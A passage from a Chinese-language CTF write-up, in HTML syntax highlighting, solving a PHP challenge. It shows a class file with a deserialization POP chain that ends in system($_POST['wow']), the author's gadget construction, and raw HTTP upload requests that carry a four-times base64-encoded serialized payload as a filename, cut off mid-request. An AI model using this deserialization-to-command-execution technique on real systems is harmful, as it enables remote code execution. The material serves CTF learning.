class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">CUIASDGHFIOUWE</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">123123</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate, br</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span></code></pre>\n\n<h3 id=\"什么文件上传？\"><a href=\"#什么文件上传？\" class=\"headerlink\" title=\"什么文件上传？\"></a>什么文件上传？</h3><p>robots.txt 进去有 class.php 一眼就能瞪出来pop链子。</p>\n<pre class=\"language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">yesterday</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$learn</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$study</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"study\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$try</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">learn</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"learn&lt;br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You studied hard yesterday.&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">study</span><span class=\"token operator\">-></span><span class=\"token function\">hard</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">today</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$doing</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$did</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$done</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">did</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"What you did makes you outstanding.&lt;br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arg1</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$arg2</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">done</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"And what you've done has given you a choice.&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">done</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">doing</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">666</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">doing</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">doing</span><span class=\"token operator\">-></span><span class=\"token property\">better</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">tommoraw</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$good</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$bad</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$soso</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">good</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"You'll be good tommoraw!&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">good</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arg1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">bad</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"You'll be bad tommoraw!&lt;br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">future</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$impossible</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"How can you get here?&lt;br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$out</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$no</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$useful1</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful2</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful3</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful4</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful5</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful6</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful7</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful8</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful9</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful10</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful11</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful12</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful13</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful14</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful15</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful16</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful17</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful18</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful19</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful20</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__set</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arg1</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$arg2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">out</span><span class=\"token operator\">-></span><span class=\"token property\">useful7</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Seven is my lucky number&lt;br>\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'whoami'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"This is your future.&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"wow\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"win\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">no</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"no\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">no</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$evil</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">yesterday</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$evil</span> <span class=\"token operator\">-></span> <span class=\"token property\">study</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">today</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$evil</span> <span class=\"token operator\">-></span> <span class=\"token property\">study</span> <span class=\"token operator\">-></span> <span class=\"token property\">doing</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">future</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></code></pre>\n\n<p>随后序列化evil。base64四次。随后上传文件通过file_exists的检查即可。</p>\n<pre class=\"language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/upload.php</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">node1.tgctf.woooo.tech:32439</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">5437</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Origin</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://node1.tgctf.woooo.tech:32439</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">multipart/form-data; boundary=----WebKitFormBoundaryurqPJUpE3whNwI5B</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Referer</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://node1.tgctf.woooo.tech:32439/</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate, br</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span>\n\n------WebKitFormBoundaryurqPJUpE3whNwI5B\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Disposition</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">form-data; name=\"Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1ZqQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXWVhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJUm10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0=.txt\"; filename=\"Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1ZqQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXWVhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJUm10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0=.txt\"</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/octet-stream</span></span>\n\n111\n\n------WebKitFormBoundaryurqPJUpE3whNwI5B--\n<span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/class.php?filename=Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1ZqQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5